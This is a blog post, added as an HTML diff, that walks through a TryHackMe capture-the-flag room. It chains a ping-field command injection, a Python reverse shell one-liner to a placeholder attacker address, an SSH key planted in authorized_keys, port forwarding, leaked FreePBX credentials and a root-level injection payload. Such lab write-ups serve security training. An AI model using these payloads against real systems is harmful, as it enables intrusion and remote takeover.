@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Hacker Holidays 2026: Infinity Pool — AryterLog</title>
+
+  <!-- PWA -->
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#080b10">
+  <link rel="icon" href="../../icons/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../../icons/apple-touch-icon.png">
+  <meta name="description" content="A Boot2Root writeup covering command injection, reverse-shell access, localhost service enumeration, SSH port forwarding, FreePBX credential discovery, automation-key extraction, and root-level command injection.">
+  <link rel="canonical" href="https://giriaryan694-a11y.github.io/AryterLog/posts/infinity-pool/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="TryHackMe Hacker Holidays 2026: Infinity Pool">
+  <meta property="og:description" content="A Boot2Root writeup covering command injection, reverse-shell access, localhost service enumeration, SSH port forwarding, FreePBX credential discovery, automation-key extraction, and root-level command injection.">
+  <meta property="og:url" content="https://giriaryan694-a11y.github.io/AryterLog/posts/infinity-pool/">
+  <meta property="og:site_name" content="AryterLog">
+  <meta property="article:published_time" content="2026-08-08T00:00:00.000Z">
+  <meta property="article:tag" content="ctf">
+  <meta property="article:tag" content="pentesting">
+  <meta property="article:tag" content="web-security">
+  <meta property="article:tag" content="post-exploitation">
+  <meta property="article:tag" content="privilege-escalation">
+  <meta property="article:tag" content="tunneling">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Hacker Holidays 2026: Infinity Pool">
+  <meta name="twitter:description" content="A Boot2Root writeup covering command injection, reverse-shell access, localhost service enumeration, SSH port forwarding, FreePBX credential discovery, automation-key extraction, and root-level command injection.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe Hacker Holidays 2026: Infinity Pool","description":"A Boot2Root writeup covering command injection, reverse-shell access, localhost service enumeration, SSH port forwarding, FreePBX credential discovery, automation-key extraction, and root-level command injection.","datePublished":"2026-08-08T00:00:00.000Z","author":{"@type":"Person","name":"Aryan Giri"},"publisher":{"@type":"Organization","name":"AryterLog"},"mainEntityOfPage":"https://giriaryan694-a11y.github.io/AryterLog/posts/infinity-pool/","keywords":"ctf, pentesting, web-security, post-exploitation, privilege-escalation, tunneling"}</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#080b10; --surface:#0d1117; --surface2:#111820; --surface3:#161d27;
+      --text:#d0dbe8; --text2:#7a8a9a; --accent:#00ff88; --accent2:#0ea5e9;
+      --danger:#ff4560; --border:#1e2a38; --border2:#2a3848; --code-bg:#0a0f16;
+      --glow:rgba(0,255,136,0.08); --glow2:rgba(0,255,136,0.18);
+    }
+    .light {
+      --bg:#f5f7fa; --surface:#ffffff; --surface2:#f0f4f8; --surface3:#e8eef5;
+      --text:#111827; --text2:#6b7280; --accent:#059669; --accent2:#0284c7;
+      --danger:#dc2626; --border:#e2e8f0; --border2:#cbd5e1; --code-bg:#f1f5f9;
+      --glow:rgba(5,150,105,0.07); --glow2:rgba(5,150,105,0.14);
+    }
+    .eye-saver {
+      --bg:#12100a; --surface:#1a1608; --surface2:#211c0c; --surface3:#282210;
+      --text:#e8d8b0; --text2:#9a8860; --accent:#f5c542; --accent2:#e08030;
+      --danger:#e05050; --border:#302810; --border2:#3d3418; --code-bg:#0f0d06;
+      --glow:rgba(245,197,66,0.08); --glow2:rgba(245,197,66,0.18);
+    }
+
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body {
+      font-family:'Fira Code',monospace;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      transition:background 0.4s,color 0.4s;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+      background-size:44px 44px; opacity:0.25;
+    }
+
+    header {
+      position:sticky; top:0; z-index:200;
+      background:rgba(8,11,16,0.86); backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 22px; height:56px; gap:12px;
+    }
+    .light header{background:rgba(245,247,250,0.9);}
+    .eye-saver header{background:rgba(18,16,10,0.9);}
+    header::after {
+      content:''; position:absolute; bottom:-1px; left:8%; right:8%; height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),transparent); opacity:0.35;
+    }
+    .header-left{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+
+    .logo {
+      font-family:'Bebas Neue',sans-serif; font-size:24px; font-weight:400;
+      letter-spacing:3px; color:var(--text); text-decoration:none; white-space:nowrap;
+      flex-shrink:0; line-height:1; transition:color 0.2s;
+    }
+    .logo .lo-a{color:var(--accent);}
+    .logo:hover .lo-a{text-shadow:0 0 14px var(--accent);}
+
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      background:transparent; border:1px solid var(--border2); color:var(--text2);
+      padding:6px 12px; border-radius:6px; cursor:pointer; transition:all 0.2s;
+      font-family:'Fira Code',monospace; font-size:11px; text-decoration:none;
+    }
+    .back-link:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    #theme-btn {
+      background:transparent; border:1px solid var(--border2);
+      padding:5px 11px; cursor:pointer; color:var(--text2); border-radius:6px;
+      transition:all 0.2s; font-family:'Fira Code',monospace; font-size:11px;
+      display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
+    }
+    #theme-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    @keyframes popSpin{0%{transform:scale(0.4) rotate(-60deg);opacity:0;}70%{transform:scale(1.15) rotate(5deg);}100%{transform:scale(1) rotate(0deg);opacity:1;}}
+    .emoji{display:inline-block;}
+
+    main{max-width:760px;margin:0 auto;padding:34px 20px 60px;position:relative;z-index:1;}
+
+    .back-btn {
+      display:inline-flex;align-items:center;gap:7px;margin-bottom:20px;
+      background:var(--surface);border:1px solid var(--border2);color:var(--text2);
+      padding:7px 13px;border-radius:6px;font-family:'Fira Code',monospace;font-size:11px;
+      cursor:pointer;transition:all 0.2s;text-decoration:none;
+    }
+    .back-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    .post-content {
+      background:var(--surface);border:1px solid var(--border);border-radius:12px;
+      padding:34px 30px;position:relative;overflow:hidden;
+    }
+    .post-content::before {
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      border-radius:12px 12px 0 0;
+    }
+    .post-content *{max-width:100%;}
+
+    h1 {
+      font-family:'Space Grotesk',sans-serif;font-size:clamp(19px,4vw,26px);
+      font-weight:700;color:var(--text);margin-bottom:8px;line-height:1.25;word-break:break-word;
+    }
+    .post-header-meta{
+      font-family:'Fira Code',monospace;font-size:11px;color:var(--text2);
+      padding-bottom:18px;margin-bottom:22px;border-bottom:1px solid var(--border);
+      display:flex;gap:8px;flex-wrap:wrap;align-items:center;
+    }
+    .card-cat-chip {
+      display:inline-flex;align-items:center;padding:1px 7px;border-radius:3px;
+      border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+      font-size:9px;font-family:'Fira Code',monospace;font-weight:500;letter-spacing:0.4px;
+    }
+    h2,h3{font-family:'Space Grotesk',sans-serif;font-weight:600;color:var(--text);margin:26px 0 10px;word-break:break-word;}
+    h2{font-size:19px;} h3{font-size:15px;color:var(--accent);}
+    p{font-size:14px;line-height:1.8;margin-bottom:14px;color:var(--text);}
+    ul,ol{padding-left:20px;margin-bottom:14px;font-size:14px;line-height:1.8;}
+    li{margin-bottom:4px;}
+
+    a{color:var(--accent);word-break:break-all;overflow-wrap:break-word;transition:opacity 0.2s;}
+    a:hover{opacity:0.75;}
+    .post-content a{text-decoration:underline;text-underline-offset:3px;}
+
+    code {
+      background:var(--code-bg);border:1px solid var(--border);padding:2px 6px;
+      border-radius:4px;font-family:'Fira Code',monospace;font-size:0.85em;
+      color:var(--accent);word-break:break-all;overflow-wrap:break-word;
+    }
+    pre {
+      background:var(--code-bg);border:1px solid var(--border);padding:18px;border-radius:8px;
+      max-width:100%; overflow:hidden;
+      position:relative;margin-bottom:14px;
+    }
+    pre::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:0.5;border-radius:8px 8px 0 0;
+    }
+    pre code{
+      background:transparent;border:none;padding:0 60px 0 0;word-break:normal;
+      overflow-wrap:normal;white-space:pre;display:block;
+      overflow-x:auto;-webkit-overflow-scrolling:touch;
+      font-size:13px;line-height:1.65;color:var(--text);
+    }
+    blockquote{
+      border-left:2px solid var(--accent);margin:14px 0;padding:10px 16px;
+      background:var(--glow);border-radius:0 6px 6px 0;font-style:italic;color:var(--text2);
+    }
+    table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;font-size:13px;margin-bottom:14px;}
+    th,td{border:1px solid var(--border);padding:8px 12px;text-align:left;white-space:nowrap;}
+    th{background:var(--surface2);color:var(--accent);font-weight:600;}
+    img{max-width:100%;height:auto;border-radius:8px;display:block;margin:14px 0;}
+
+    .copy-btn {
+      position:absolute;top:9px;right:9px;padding:3px 8px;font-size:10px;
+      font-family:'Fira Code',monospace;font-weight:500;background:var(--surface2);
+      border:1px solid var(--border2);color:var(--text2);border-radius:4px;cursor:pointer;
+      transition:all 0.2s;opacity:0;letter-spacing:0.3px;
+    }
+    pre:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    .copy-btn.copied{border-color:var(--accent);color:var(--accent);opacity:1;}
+
+    footer{
+      text-align:center;padding:22px 16px;color:var(--text2);
+      font-family:'Fira Code',monospace;font-size:11px;
+      border-top:1px solid var(--border);position:relative;z-index:1;
+    }
+    .f-accent{color:var(--accent);}
+    footer a{color:var(--accent);text-decoration:none;}
+    footer a:hover{opacity:0.75;}
+
+    @media(max-width:480px){
+      header{padding:0 13px;height:50px;}
+      .logo{font-size:21px;letter-spacing:2px;}
+      main{padding:20px 14px 44px;}
+      .post-content{padding:20px 14px;}
+      pre{padding:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <a href="../../index.html" class="logo">Aryter<span class="lo-a">Log</span></a>
+    </div>
+    <button id="theme-btn" aria-label="Cycle Theme">
+      <span class="emoji" id="theme-emoji">🌙</span>
+      <span id="theme-label">Dark</span>
+    </button>
+  </header>
+
+  <main>
+    <a href="../../index.html#post-infinity-pool" class="back-btn">← Back to Blog</a>
+    <article class="post-content">
+      <h1>TryHackMe Hacker Holidays 2026: Infinity Pool</h1>
+      <div class="post-header-meta">
+        <span>📅 Published 08-08-2026</span>
+        <span>·</span><span class="card-cat-chip">ctf</span><span class="card-cat-chip">pentesting</span><span class="card-cat-chip">web-security</span><span class="card-cat-chip">post-exploitation</span><span class="card-cat-chip">privilege-escalation</span><span class="card-cat-chip">tunneling</span>
+      </div>
+      <p>Written By Aryan Giri</p>
+<p><strong>Room:</strong> Infinity Pool<br><strong>Category:</strong> Boot2Root<br><strong>Difficulty:</strong> Medium<br><strong>Points:</strong> 90<br><strong>Platform:</strong> TryHackMe<br><strong>Room URL:</strong> <a href="https://tryhackme.com/room/hh-infinitypool-5b3548af">https://tryhackme.com/room/hh-infinitypool-5b3548af</a></p>
+<h2>Concierge Briefing</h2>
+<blockquote>
+<p>No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.</p>
+</blockquote>
+<p>The objective is straightforward:</p>
+<ul>
+<li>Find the user flag</li>
+<li>Find the root flag</li>
+</ul>
+<p>The interesting part is how the attack chain develops. Initial access comes from command injection in a web application, while privilege escalation requires discovering services that are only reachable from the target itself.</p>
+<hr>
+<h2>Initial Web Enumeration</h2>
+<p>The target machine provided by the room was:</p>
+<pre><code class="language-text">http://10.49.175.103
+</code></pre>
+<p>I started by opening the web application in a browser.</p>
+<img width="1274" height="753" alt="Screenshot 2026-08-07 211141" src="https://github.com/user-attachments/assets/29a9064d-2297-41fb-9381-c839534a9045" />
+
+
+<p>There was not much visible functionality, so the next step was source-code reconnaissance.</p>
+<p>Looking through the webpage source revealed an interesting reference to an <code>app.py</code> file.</p>
+<img width="626" height="121" alt="Screenshot 2026-08-07 211212" src="https://github.com/user-attachments/assets/0aca9be6-2a39-4f9f-9687-f2ba92eacc4c" />
+<img width="741" height="214" alt="Screenshot 2026-08-07 211227" src="https://github.com/user-attachments/assets/5e78086a-a66f-487d-95ef-a8d56660d35c" />
+
+
+<p>The application exposed endpoints including:</p>
+<pre><code class="language-text">/status
+/internal/netcheck
+</code></pre>
+<p>The <code>/internal/netcheck</code> endpoint returned <code>Method Not Allowed</code> when accessed directly, while <code>/status</code> exposed functionality that allowed an IP address to be supplied for a ping operation.</p>
+<hr>
+<h2>Command Injection</h2>
+<p>The ping functionality immediately looked interesting.</p>
+<img width="1264" height="713" alt="Screenshot 2026-08-07 211403" src="https://github.com/user-attachments/assets/d1f8de6b-765a-4af8-be3c-7d58be9dba85" />
+
+
+<p>Instead of supplying only an IP address, I tested whether additional shell syntax would be interpreted.</p>
+<p>For example:</p>
+<pre><code class="language-text">127.0.0.1 ; pwd
+</code></pre>
+<p>The application executed the additional command and returned the working directory.</p>
+<img width="889" height="659" alt="Screenshot 2026-08-07 211843" src="https://github.com/user-attachments/assets/7f60871d-431a-478e-8182-ef1eb3767370" />
+
+
+
+<p>This confirmed command injection and, more importantly, revealed the filesystem location from which the web application was running.</p>
+<p>At this point, the goal changed from web enumeration to obtaining interactive access to the underlying system.</p>
+<hr>
+<h2>EscapeArtist</h2>
+<p>While testing command-injection payloads, I also used one of my older utilities, <a href="https://giriaryan694-a11y.github.io/EscapeArtist/">EscapeArtist</a>.</p>
+<p>EscapeArtist is a client-side utility for security researchers, penetration testers, and CTF players that dynamically generates command-injection bypass payloads based on the target command, allowed values, and shell environment.</p>
+<img width="1736" height="933" alt="Screenshot 2026-08-07 211653" src="https://github.com/user-attachments/assets/6981967f-a285-455b-8559-3e3bfc520d1d" />
+
+
+<p>For example, if the allowed input is:</p>
+<pre><code class="language-text">127.0.0.1
+</code></pre>
+<p>and the command I want to execute is:</p>
+<pre><code class="language-text">pwd
+</code></pre>
+<p>EscapeArtist can generate a collection of syntactically valid payload variations.</p>
+<img width="1680" height="935" alt="Screenshot 2026-08-07 211746" src="https://github.com/user-attachments/assets/b57b4612-565f-4d65-8bc5-0b03c12b4591" />
+
+
+<p>Generated payloads:</p>
+<img width="1625" height="946" alt="Screenshot 2026-08-07 211806" src="https://github.com/user-attachments/assets/721e5c02-7818-4aaa-a149-35747d07ff1e" />
+
+
+<p>For this room, however, the basic command injection was already sufficient.</p>
+<hr>
+<h2>Getting a Reverse Shell</h2>
+<p>Technology reconnaissance showed that the web application was running behind Gunicorn, indicating a Python-based web service.</p>
+<p>Since arbitrary commands could already be executed, I used a Python reverse shell to obtain a proper interactive connection.</p>
+<p>First, start a listener on the attacking machine:</p>
+<pre><code class="language-bash">nc -lvnp &lt;LISTEN_PORT&gt;
+</code></pre>
+<p>Then execute the reverse-shell command through the vulnerable parameter:</p>
+<pre><code class="language-bash">127.0.0.1 | python3 -c &#39;import socket,subprocess,os; s=socket.socket(); s.connect((&quot;&lt;ATTACKER_IP&gt;&quot;,&lt;LISTEN_PORT&gt;)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#39;
+</code></pre>
+<img width="823" height="359" alt="Screenshot 2026-08-07 220056" src="https://github.com/user-attachments/assets/c3c0fbb4-a164-4843-ad7e-77251f4c3534" />
+
+
+<p>The connection came back to the listener.</p>
+<img width="638" height="191" alt="Screenshot 2026-08-07 220106" src="https://github.com/user-attachments/assets/81dac825-8c71-45c2-a7f3-797d1f04eab9" />
+
+
+<p>A proper PTY could be configured at this point, but for this room I only needed enough shell functionality to continue enumeration.</p>
+<hr>
+<h2>User Flag</h2>
+<p>After obtaining the shell, I navigated to the user&#39;s home directory and checked the flag file:</p>
+<pre><code class="language-bash">cd
+cat user.txt
+</code></pre>
+<img width="562" height="233" alt="Screenshot 2026-08-07 224358" src="https://github.com/user-attachments/assets/2e7d22da-d4ea-4495-9142-662cac5b1808" />
+
+
+<p>The user flag was successfully obtained.</p>
+<p>The flag itself is omitted because of TryHackMe&#39;s room-content rules.</p>
+<hr>
+<h1>Privilege Escalation</h1>
+<p>Getting the user shell was only the beginning.</p>
+<p>Traditional privilege-escalation enumeration did not immediately reveal an obvious path to root, so I started looking at local services.</p>
+<p>One of the most useful commands here was:</p>
+<pre><code class="language-bash">ss -tuln
+</code></pre>
+<img width="642" height="599" alt="Screenshot 2026-08-08 142217" src="https://github.com/user-attachments/assets/8d7b49ea-f41f-47f3-bc66-ebaf2c9bc49d" />
+
+
+<p>The output showed several TCP and UDP services, including services bound only to localhost.</p>
+<p>This was the important clue.</p>
+<p>Services listening on:</p>
+<pre><code class="language-text">127.0.0.1
+</code></pre>
+<p>cannot normally be reached directly from the attacking machine.</p>
+<p>The internal architecture eventually revealed three important services:</p>
+<pre><code class="language-text">127.0.0.1:3000
+    Watchtower
+    Configuration API
+
+127.0.0.1:8080
+    Apache / FreePBX UCP
+
+127.0.0.1:9000
+    Automation service
+</code></pre>
+<p>There was also an Asterisk AMI service listening locally on port <code>5038</code>.</p>
+<p>The attack path therefore became:</p>
+<pre><code class="language-text">Command Injection
+        |
+        v
+Reverse Shell
+        |
+        v
+Local Service Enumeration
+        |
+        v
+Watchtower Configuration Leak
+        |
+        v
+FreePBX UCP
+        |
+        v
+Automation Key
+        |
+        v
+Automation API
+        |
+        v
+Command Injection as root
+        |
+        v
+Root Flag
+</code></pre>
+<hr>
+<h2>Enumerating the Internal Web Services</h2>
+<p>I first checked the HTTP services from the compromised machine.</p>
+<p>For example:</p>
+<pre><code class="language-bash">curl -s -I http://127.0.0.1:8080/ucp
+</code></pre>
+<p>The service on port <code>8080</code> returned a redirect, indicating that this was the Apache/FreePBX service.</p>
+<img width="556" height="241" alt="Screenshot 2026-08-08 142427" src="https://github.com/user-attachments/assets/ae7fb790-c63c-4d35-a9ef-a95aaad615a1" />
+
+
+<p>There was also an HTTP service on another local port, but it was the raw Asterisk HTTP server rather than the FreePBX UCP interface.</p>
+<p>The key point was that the interesting services were intentionally inaccessible from outside the machine.</p>
+<hr>
+<h1>Harvesting Credentials from Watchtower</h1>
+<p>The service on port <code>3000</code> exposed a configuration API.</p>
+<p>I queried it with:</p>
+<pre><code class="language-bash">curl -s http://127.0.0.1:3000/api/config
+</code></pre>
+<img width="724" height="99" alt="Screenshot 2026-08-08 142307" src="https://github.com/user-attachments/assets/d6653e95-c475-4f3b-aa11-024d518fdb55" />
+
+
+<p>The response disclosed credentials for the FreePBX UCP application:</p>
+<pre><code class="language-text">User: FreePBXUCPTemplateCreator
+Pass: $t4yN0t1c3d_2026
+</code></pre>
+<p>These credentials were important because they allowed access to the internal FreePBX interface.</p>
+<hr>
+<h1>Reaching Localhost Services with SSH Port Forwarding</h1>
+<p>The FreePBX UCP service was listening internally on the target, so accessing it directly from the attacking machine was not possible.</p>
+<p>This is where SSH local port forwarding becomes useful.</p>
+<p>First, I generated an RSA key on the attacking machine:</p>
+<pre><code class="language-bash">ssh-keygen -t rsa -b 2048 -f ~/.ssh/infinity_pool_key -N &quot;&quot;
+</code></pre>
+<p>The public key can be displayed again if the terminal has been cleared:</p>
+<pre><code class="language-bash">cat ~/.ssh/infinity_pool_key.pub
+</code></pre>
+<p>From the existing shell on the target, I created the SSH directory if necessary:</p>
+<pre><code class="language-bash">mkdir -p ~/.ssh
+</code></pre>
+<p>Then added the attacker&#39;s public key:</p>
+<pre><code class="language-bash">echo &quot;ssh-rsa &lt;PASTE_YOUR_PUBLIC_KEY_HERE&gt;&quot; &gt;&gt; ~/.ssh/authorized_keys
+</code></pre>
+<img width="1312" height="615" alt="Screenshot 2026-08-08 140943" src="https://github.com/user-attachments/assets/993ac99b-91b9-4b13-bd94-0b52314838cf" />
+
+<p>This allowed me to establish an SSH connection using the generated key.</p>
+<hr>
+<h2>Creating the SSH Tunnel</h2>
+<p>From the attacking machine:</p>
+<pre><code class="language-bash">ssh -i ~/.ssh/infinity_pool_key -L 8080:127.0.0.1:8080 web@10.48.147.49
+</code></pre>
+<p>The important part is:</p>
+<pre><code class="language-text">-L 8080:127.0.0.1:8080
+</code></pre>
+<p>This maps:</p>
+<pre><code class="language-text">Attacker localhost:8080
+        |
+        v
+SSH tunnel
+        |
+        v
+Target 127.0.0.1:8080
+</code></pre>
+<img width="623" height="193" alt="Screenshot 2026-08-08 142610" src="https://github.com/user-attachments/assets/94774a44-1407-49c9-8307-0f6d6823ccb4" />
+
+
+<p>Now the internal FreePBX service could be accessed through the attacker&#39;s own browser.</p>
+<hr>
+<h1>Accessing FreePBX UCP</h1>
+<p>With the tunnel active, I opened:</p>
+<pre><code class="language-text">http://127.0.0.1:8080/ucp
+</code></pre>
+<img width="1426" height="862" alt="Screenshot 2026-08-08 142640" src="https://github.com/user-attachments/assets/c56495d1-08df-4af5-b622-89b27fdf56a7" />
+
+
+<p>The page took some time to load.</p>
+<p>A useful way to verify that the tunnel itself is working is to open:</p>
+<pre><code class="language-text">http://127.0.0.1:8080
+</code></pre>
+<p>This returned the Ubuntu default webpage immediately.</p>
+<p>If that page works but UCP takes longer to load, the SSH tunnel itself is probably functioning correctly.</p>
+<p>The UCP login page requested credentials.</p>
+<p>I used the credentials discovered from Watchtower:</p>
+<pre><code class="language-text">Username:
+FreePBXUCPTemplateCreator
+
+Password:
+$t4yN0t1c3d_2026
+</code></pre>
+<img width="740" height="405" alt="Screenshot 2026-08-08 142811" src="https://github.com/user-attachments/assets/dfcf1fc1-705d-4649-9bc2-34de51067cb4" />
+
+
+<p>After authentication, the UCP interface loaded.</p>
+<img width="437" height="453" alt="Screenshot 2026-08-08 142848" src="https://github.com/user-attachments/assets/f0e7e4a1-33d3-4b7d-92f8-e6ef720db388" />
+
+
+<p>A short setup guide appeared. I proceeded through it until reaching the main dashboard.</p>
+<hr>
+<h1>Finding the Automation Key</h1>
+<p>The UCP interface contained dashboard functionality.</p>
+<p>There were two <code>+</code> buttons, one on the left and another on the right.<br><img width="1919" height="352" alt="Screenshot 2026-08-08 143246" src="https://github.com/user-attachments/assets/16090c13-45de-4da9-85c5-e140653abd2c" /></p>
+<p>The Left-side <code>+</code> was the one needed to create a dashboard.</p>
+<p>I created a dashboard named:</p>
+<pre><code class="language-text">tester
+</code></pre>
+<img width="665" height="279" alt="Screenshot 2026-08-08 143304" src="https://github.com/user-attachments/assets/c79dac72-c6d4-4291-9a3e-1faad5e97ae1" />
+
+
+<p>Next, I used the right-side <code>+</code> to add a widget.</p>
+<img width="1028" height="308" alt="Screenshot 2026-08-08 143319" src="https://github.com/user-attachments/assets/64e7be51-35aa-4db8-a912-6f6c7728e254" />
+
+
+<p>From the available widgets, I selected the voicemail widget.</p>
+<img width="686" height="757" alt="Screenshot 2026-08-08 143330" src="https://github.com/user-attachments/assets/d1d73b59-7de3-4330-9a7f-75518447a85c" />
+
+
+<p>After adding it, the voicemail information appeared in the dashboard.</p>
+<img width="1060" height="482" alt="Screenshot 2026-08-08 143435" src="https://github.com/user-attachments/assets/3d4260f7-1de8-4b32-97cf-0c65de142475" />
+
+
+<p>The important information was in the <strong>Caller ID</strong> field.</p>
+<p>The Caller ID contained an automation key resembling:</p>
+<pre><code class="language-text">cc_auto_...
+</code></pre>
+<p>I copied this key because it was required to interact with the internal automation service.</p>
+<hr>
+<h1>Exploiting the Automation Service</h1>
+<p>The final internal service was listening on:</p>
+<pre><code class="language-text">127.0.0.1:9000
+</code></pre>
+<p>The discovered automation key could be supplied as a Bearer token.</p>
+<p>First, I stored the key in a shell variable:</p>
+<pre><code class="language-bash">KEY=&#39;&lt;YOUR_AUTOMATION_KEY&gt;&#39;
+</code></pre>
+<p>The service exposed an export endpoint:</p>
+<pre><code class="language-text">POST /jobs/export
+</code></pre>
+<p>I tested whether the <code>report</code> parameter was safely handled.</p>
+<p>The parameter was vulnerable to command injection.</p>
+<p>Since the export job executed with root privileges, command injection here provided a path from the existing user context to root.</p>
+<p>To retrieve the root flag:</p>
+<pre><code class="language-bash">curl -s -X POST \
+-H &quot;Authorization: Bearer $KEY&quot; \
+-H &quot;Content-Type: application/json&quot; \
+http://127.0.0.1:9000/jobs/export \
+-d &#39;{&quot;report&quot;:&quot;test; cat /root/root.txt;&quot;}&#39;
+</code></pre>
+<img width="1617" height="842" alt="Screenshot 2026-08-08 143656" src="https://github.com/user-attachments/assets/19208481-8bfc-4011-89f7-585e79f7ddfd" />
+
+
+
+<p>The response contained the root flag.</p>
+<p>The flag is omitted because of TryHackMe&#39;s room-content rules.</p>
+<hr>
+<h1>Attack Chain</h1>
+<p>The complete compromise can be summarized as:</p>
+<pre><code class="language-text">Internet-facing web application
+            |
+            v
+Source-code reconnaissance
+            |
+            v
+/status ping functionality
+            |
+            v
+Command Injection
+            |
+            v
+Python Reverse Shell
+            |
+            v
+Local enumeration with ss
+            |
+            v
+127.0.0.1:3000 Watchtower
+            |
+            v
+FreePBX credentials
+            |
+            v
+SSH local port forwarding
+            |
+            v
+FreePBX UCP
+            |
+            v
+Voicemail widget
+            |
+            v
+Automation Key
+            |
+            v
+127.0.0.1:9000
+            |
+            v
+/jobs/export command injection
+            |
+            v
+Root execution
+            |
+            v
+/root/root.txt
+</code></pre>
+<h2>Lessons from the Room</h2>
+<p>Infinity Pool was less about finding a single vulnerability and more about chaining several weaknesses together.</p>
+<p>The first major issue was command injection in the web application&#39;s ping functionality. A feature intended to perform a simple network diagnostic allowed attacker-controlled shell commands to reach the underlying operating system.</p>
+<p>The second important discovery was that localhost-only services should not be ignored. Binding an application to <code>127.0.0.1</code> prevents direct remote access, but it does not make the service inherently secure. Once an attacker obtains shell access, those services become part of the attack surface.</p>
+<p>The Watchtower configuration endpoint demonstrated another common failure: sensitive credentials exposed through an internal configuration API.</p>
+<p>SSH port forwarding then provided a clean way to reach an otherwise inaccessible service:</p>
+<pre><code class="language-text">Attacker -&gt; SSH -&gt; Target localhost service
+</code></pre>
+<p>The FreePBX interface ultimately exposed an automation credential, which became the bridge to the final privilege-escalation stage.</p>
+<p>Finally, the automation service trusted a user-controlled <code>report</code> value while executing an export operation as root. That turned a seemingly ordinary API parameter into a root-level command-execution primitive.</p>
+<p>The most important lesson from the room is therefore the attack-chain mindset:</p>
+<pre><code class="language-text">Initial RCE
+    +
+Internal service discovery
+    +
+Credential exposure
+    +
+Local service access
+    +
+Application-level token
+    +
+Privileged command injection
+    =
+Full system compromise
+</code></pre>
+<p>A service being hidden behind localhost is not the same thing as being secure. Once an attacker gets execution on the host, the entire internal service topology becomes part of the reachable attack surface.</p>
+
+    </article>
+  </main>
+
+  <footer>
+    <span class="f-accent">$</span> echo "Made by <span class="f-accent">Aryan Giri</span>" &nbsp;·&nbsp; <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener noreferrer">GitHub</a>
+  </footer>
+
+  <script>
+    /* Theme — synced with main site via same cookie */
+    const themes=["dark","light","eye-saver"];
+    const themeData={"dark":{emoji:"🌙",label:"Dark"},"light":{emoji:"☀️",label:"Light"},"eye-saver":{emoji:"☕",label:"Reading"}};
+    function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+d*86400000);document.cookie=`${n}=${v};expires=${e.toUTCString()};path=/`;}
+    function getCookie(n){const m=document.cookie.match(new RegExp('(^| )'+n+'=([^;]+)'));return m?m[2]:null;}
+    let currentTheme=getCookie("site_theme")||"dark";
+    const themeBtn=document.getElementById("theme-btn");
+    const themeEmoji=document.getElementById("theme-emoji");
+    function applyTheme(theme,animate=false){
+      document.body.className=theme==="dark"?"":theme;
+      themeEmoji.textContent=themeData[theme].emoji;
+      document.getElementById("theme-label").textContent=themeData[theme].label;
+      setCookie("site_theme",theme,365);
+      if(animate){themeEmoji.style.animation="none";themeEmoji.offsetHeight;themeEmoji.style.animation="popSpin 0.4s cubic-bezier(0.175,0.885,0.32,1.275) forwards";}
+    }
+    applyTheme(currentTheme);
+    themeBtn.addEventListener("click",()=>{currentTheme=themes[(themes.indexOf(currentTheme)+1)%themes.length];applyTheme(currentTheme,true);});
+
+    /* Links → new tab + copy buttons on code blocks */
+    document.querySelectorAll(".post-content a").forEach(l => {
+      l.setAttribute("target", "_blank");
+      l.setAttribute("rel", "noopener noreferrer");
+    });
+    document.querySelectorAll("pre").forEach(pre => {
+      const code = pre.querySelector("code");
+      if (!code) return;
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "copy";
+      btn.onclick = async () => {
+        try { await navigator.clipboard.writeText(code.innerText.trimEnd()); }
+        catch {}
+        btn.textContent = "✓ copied"; btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 2000);
+      };
+      pre.appendChild(btn);
+    });
+  </script>
+</body>
+</html>
